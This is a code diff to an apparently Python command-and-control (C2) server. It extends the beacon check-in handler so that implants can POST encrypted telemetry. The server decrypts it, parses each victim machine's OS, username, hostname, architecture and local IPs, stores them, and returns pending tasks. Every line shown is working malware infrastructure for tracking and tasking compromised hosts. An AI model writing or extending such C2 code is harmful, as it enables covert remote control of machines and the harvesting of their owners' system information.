@@ -112,13 +112,45 @@ def decrypt_data(ciphertext_b64: str) -> str:
 # ── aiohttp Handlers ───────────────────────────────────────────────────────
 
 async def handle_checkin(request: web.Request) -> web.Response:
-    """GET /api/v1/ping — Beacon checks in and requests pending tasks."""
+    """GET/POST /api/v1/ping — Beacon checks in and requests pending tasks.
+       If POST, body contains encrypted telemetry JSON."""
     try:
         beacon_id = request.headers.get("X-Beacon-Id")
         if not beacon_id:
             return web.Response(status=400)
 
-        c2_state.update_beacon(beacon_id, {"ip": request.remote})
+        info = {"ip": request.remote}
+
+        if request.method == "POST" and request.can_read_body:
+            encrypted_body = await request.text()
+            if encrypted_body:
+                decrypted_body = decrypt_data(encrypted_body)
+                if decrypted_body:
+                    try:
+                        data = json.loads(decrypted_body)
+                        sysinfo = data.get("sysinfo", "")
+                        netinfo = data.get("netinfo", "")
+                        
+                        # Basic parsing of sysinfo lines
+                        for line in sysinfo.split("\n"):
+                            if line.startswith("OS: "): info["os"] = line[4:].strip()
+                            if line.startswith("Username: "): info["user"] = line[10:].strip()
+                            if line.startswith("Architecture: "): info["arch"] = line[14:].strip()
+                            if line.startswith("Hostname: "): info["hostname"] = line[10:].strip()
+                        
+                        # Basic parsing of netinfo for local IPs
+                        ips = []
+                        for line in netinfo.split("\n"):
+                            if "IP: " in line:
+                                ips.append(line.split("IP: ")[1].split(" ")[0])
+                            elif "IP (v4): " in line:
+                                ips.append(line.split("IP (v4): ")[1].strip())
+                        if ips:
+                            info["local_ips"] = ", ".join(ips)
+                    except Exception as e:
+                        logger.error(f"Failed to parse telemetry: {e}")
+
+        c2_state.update_beacon(beacon_id, info)
 
         pending = c2_state.get_pending_tasks(beacon_id)
         response_data = json.dumps({"tasks": pending})
